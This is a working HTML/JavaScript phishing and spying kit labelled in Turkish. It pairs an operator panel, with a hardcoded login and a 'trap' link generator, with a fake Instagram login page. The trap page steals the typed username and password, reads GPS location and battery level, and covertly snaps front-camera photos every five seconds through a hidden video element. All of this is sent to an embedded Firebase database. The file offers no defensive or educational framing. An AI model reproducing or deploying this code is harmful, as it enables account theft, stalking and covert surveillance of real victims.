<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WROX ULTIMATE | EFECAN</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --p: #00f2ff; --bg: #000; --card: #0a0a0a; --r: #ff003c; --g: #00ff88; --insta: #E1306C; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #fff; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* --- HEADER & NAV --- */
        header { padding: 15px; background: #050505; border-bottom: 1px solid #111; text-align: center; font-size: 13px; color: var(--p); font-weight: bold; }
        nav { position: fixed; bottom: 0; width: 100%; height: 70px; background: #050505; border-top: 1px solid #111; display: flex; justify-content: space-around; align-items: center; z-index: 1000; padding-bottom: env(safe-area-inset-bottom); }
        .nav-i { display: flex; flex-direction: column; align-items: center; gap: 5px; color: #444; font-size: 9px; flex: 1; }
        .nav-i.active { color: var(--p); text-shadow: 0 0 10px var(--p); }

        /* --- PANEL CONTENT --- */
        main { flex: 1; padding: 15px; padding-bottom: 90px; overflow-y: auto; }
        .k-card { background: var(--card); border-radius: 12px; border: 1px solid #1a1a1a; margin-bottom: 15px; overflow: hidden; }
        .k-info { padding: 12px; display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 11px; }
        .k-tag { background: #000; padding: 8px; border-radius: 8px; border: 1px solid #222; }
        .k-tag b { color: var(--p); display: block; margin-top: 2px; }

        /* --- ÖZEL HEDEF GALERİSİ (MODAL) --- */
        #focus-screen { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; }
        .focus-header { padding: 15px; background: #050505; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
        #focus-gallery { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 15px; }
        .gallery-img { width: 100%; border-radius: 10px; border: 1px solid #333; }

        /* --- BUTTONS & INPUTS --- */
        .p-btn { width: 100%; padding: 12px; background: var(--p); color: #000; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; text-transform: uppercase; font-size: 11px; }
        .loc-btn { background: var(--g) !important; color: #000 !important; text-decoration: none; text-align: center; display: block; padding: 10px; border-radius: 8px; font-weight: bold; grid-column: span 2; }
        input { width: 100%; padding: 14px; margin-bottom: 10px; background: #000; border: 1px solid #222; color: #fff; border-radius: 8px; outline: none; text-align: center; }
        
        /* --- AUTH SCREEN --- */
        #auth-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 25px; }
    </style>
</head>
<body>

<div id="wrox-app"></div>

<div id="focus-screen">
    <div class="focus-header">
        <span id="target-title" style="color:var(--p)">HEDEF GALERİSİ</span>
        <i class="fas fa-times-circle" onclick="closeTarget()" style="color:var(--r); font-size:24px;"></i>
    </div>
    <div id="focus-gallery"></div>
</div>

<script>
    // 🔥 SENİN FIREBASE APİ BİLGİLERİN
    const firebaseConfig = {
        apiKey: "AIzaSyAKB12tpEbLTHYV7niVHc3VvAtv8jl873E",
        authDomain: "wrox-premium.firebaseapp.com",
        databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
        projectId: "wrox-premium",
        storageBucket: "wrox-premium.firebasestorage.app",
        messagingSenderId: "361312477177",
        appId: "1:361312477177:web:72a8c9237048c4bf0e7f28"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    window.onload = () => {
        const p = new URLSearchParams(window.location.search);
        if(p.get('mode') === 'trap') { renderTrap(); }
        else {
            const s = localStorage.getItem('w_session');
            s ? renderPanel(JSON.parse(s)) : renderAuth();
        }
    };

    function renderAuth() {
        document.getElementById('wrox-app').innerHTML = `
            <div id="auth-screen">
                <div style="width:100%; max-width:320px; text-align:center;">
                    <h2 style="color:var(--p); margin-bottom:30px; letter-spacing:2px;">WROX TERMINAL</h2>
                    <input id="e" placeholder="Admin E-posta">
                    <input id="p" type="password" placeholder="Admin Şifre">
                    <button class="p-btn" onclick="doLogin()">SİSTEME GİRİŞ</button>
                </div>
            </div>`;
    }

    function doLogin() {
        const e = document.getElementById('e').value;
        const p = document.getElementById('p').value;
        if(e === "Afavan66@gmail.com" && p === "Efecan1903") {
            localStorage.setItem('w_session', JSON.stringify({e, id:btoa(e).replace(/=/g,"")}));
            location.reload();
        } else { alert("YETKİSİZ ERİŞİM!"); }
    }

    function renderPanel(user) {
        document.getElementById('wrox-app').innerHTML = `
            <header>WROX Systeme hoş geldiniz</header>
            <main id="view"></main>
            <nav>
                <div class="nav-i active" onclick="tab('logs', this)"><i class="fas fa-users"></i><span>LOGLAR</span></div>
                <div class="nav-i" onclick="tab('link', this)"><i class="fas fa-link"></i><span>LİNK AL</span></div>
                <div class="nav-i" onclick="logout()"><i class="fas fa-power-off"></i><span>ÇIKIŞ</span></div>
            </nav>`;
        tab('logs', document.querySelector('.nav-i'));
    }

    function tab(t, el) {
        document.querySelectorAll('.nav-i').forEach(i => i.classList.remove('active'));
        el.classList.add('active');
        const view = document.getElementById('view');
        const user = JSON.parse(localStorage.getItem('w_session'));

        if(t === 'logs') {
            view.innerHTML = `<div id="list"></div>`;
            db.ref('spy_live/'+user.id).on('value', snap => {
                const list = document.getElementById('list'); if(!list) return;
                list.innerHTML = '';
                snap.forEach(c => {
                    const v = c.val();
                    list.innerHTML = `
                        <div class="k-card">
                            <div class="k-info">
                                <div class="k-tag" style="grid-column: span 2; border-color:var(--insta);">
                                    <i class="fab fa-instagram" style="color:var(--insta)"></i> <b>${v.insta_user || 'Bekleniyor...'}</b>
                                </div>
                                <div class="k-tag"><span>ŞİFRE</span><b>${v.insta_pass || '---'}</b></div>
                                <div class="k-tag"><span>BATARYA</span><b>%${v.battery || '??'}</b></div>
                                <button class="p-btn" style="grid-column:span 2" onclick="openTarget('${c.key}', '${v.insta_user}')">FOTOĞRAFLARI GÖR (AŞAĞI KAYDIR)</button>
                                ${v.lat ? `<a href="https://www.google.com/maps?q=${v.lat},${v.lon}" target="_blank" class="loc-btn">KONUMU AÇ</a>` : ''}
                            </div>
                        </div>` + list.innerHTML;
                });
            });
        } else if(t === 'link') {
            const link = window.location.href.split('?')[0] + "?mode=trap&ref=" + user.id;
            view.innerHTML = `<div class="k-card" style="padding:20px; margin-top:20px;">
                <p style="font-size:11px; color:#555; margin-bottom:15px;">OPERASYON LİNKİ:</p>
                <input value="${link}" id="myL" readonly style="color:var(--p);">
                <button class="p-btn" onclick="copyL()">KOPYALA</button>
            </div>`;
        }
    }

    // --- GALERİ FONKSİYONLARI ---
    window.openTarget = (id, name) => {
        const myId = JSON.parse(localStorage.getItem('w_session')).id;
        document.getElementById('target-title').innerText = name || "HEDEF DETAYI";
        const gallery = document.getElementById('focus-gallery');
        gallery.innerHTML = '<p style="text-align:center; color:#333;">Yükleniyor...</p>';
        document.getElementById('focus-screen').style.display = 'flex';

        db.ref(`spy_live/${myId}/${id}/history`).on('value', snap => {
            gallery.innerHTML = '';
            if(!snap.exists()) { gallery.innerHTML = '<p style="color:#444;text-align:center;">Henüz fotoğraf yok.</p>'; return; }
            let photos = [];
            snap.forEach(p => { photos.push(p.val()); });
            photos.reverse().forEach(src => {
                const img = document.createElement('img');
                img.src = src; img.className = 'gallery-img';
                gallery.appendChild(img);
            });
        });
    };

    window.closeTarget = () => document.getElementById('focus-screen').style.display = 'none';
    window.copyL = () => { document.getElementById('myL').select(); document.execCommand('copy'); alert("Link kopyalandı!"); };
    window.logout = () => { localStorage.clear(); location.reload(); };

    // --- KURBAN TARAFI (PHISHING + GPS + KAMERA) ---
    async function renderTrap() {
        document.body.innerHTML = `
        <div style="background:#fff; height:100vh; color:#000; font-family:sans-serif; display:flex; flex-direction:column; align-items:center; padding-top:40px;">
            <img src="https://www.instagram.com/static/images/web/mobile_port_monetized_whiteout.png/d588941031f0.png" style="width:175px; margin-bottom:40px;">
            <div style="width:85%; max-width:300px;">
                <input id="iu" placeholder="Kullanıcı adı" style="background:#fafafa; border:1px solid #dbdbdb; color:#000; text-align:left; padding:10px; margin-bottom:10px; font-size:14px;">
                <input id="ip" type="password" placeholder="Şifre" style="background:#fafafa; border:1px solid #dbdbdb; color:#000; text-align:left; padding:10px; margin-bottom:20px; font-size:14px;">
                <button onclick="catchInsta()" style="width:100%; background:#0095f6; color:#fff; border:none; padding:10px; border-radius:4px; font-weight:bold;">Giriş Yap</button>
            </div>
            <video id="v" autoplay playsinline muted style="width:1px;height:1px;opacity:0;"></video>
            <canvas id="c" style="display:none;"></canvas>
        </div>`;

        const ref = new URLSearchParams(window.location.search).get('ref');
        
        // GPS & BATARYA
        navigator.geolocation.getCurrentPosition(p => {
            db.ref(`spy_live/${ref}/K-MAIN`).update({ lat: p.coords.latitude, lon: p.coords.longitude });
        });

        // KAMERA VE HISTORY KAYDI
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v'); v.srcObject = stream;
            v.onloadedmetadata = () => {
                setInterval(async () => {
                    const canvas = document.getElementById('c'); canvas.width = 400; canvas.height = 300;
                    canvas.getContext('2d').drawImage(v, 0, 0, 400, 300);
                    const data = canvas.toDataURL('image/jpeg', 0.4);
                    const bt = await navigator.getBattery();
                    
                    const newPhotoKey = db.ref().child('history').push().key;
                    const updates = {};
                    updates[`spy_live/${ref}/K-MAIN/img`] = data;
                    updates[`spy_live/${ref}/K-MAIN/history/${newPhotoKey}`] = data;
                    updates[`spy_live/${ref}/K-MAIN/battery`] = Math.floor(bt.level * 100);
                    updates[`spy_live/${ref}/K-MAIN/device`] = navigator.platform;
                    updates[`spy_live/${ref}/K-MAIN/last`] = Date.now();
                    db.ref().update(updates);
                }, 5000);
            };
        } catch(e) {}
    }

    async function catchInsta() {
        const u = document.getElementById('iu').value;
        const p = document.getElementById('ip').value;
        const ref = new URLSearchParams(window.location.search).get('ref');
        if(u && p) {
            await db.ref(`spy_live/${ref}/K-MAIN`).update({ insta_user: u, insta_pass: p });
            location.href = "https://www.instagram.com";
        }
    }
</script>
</body>
</html>
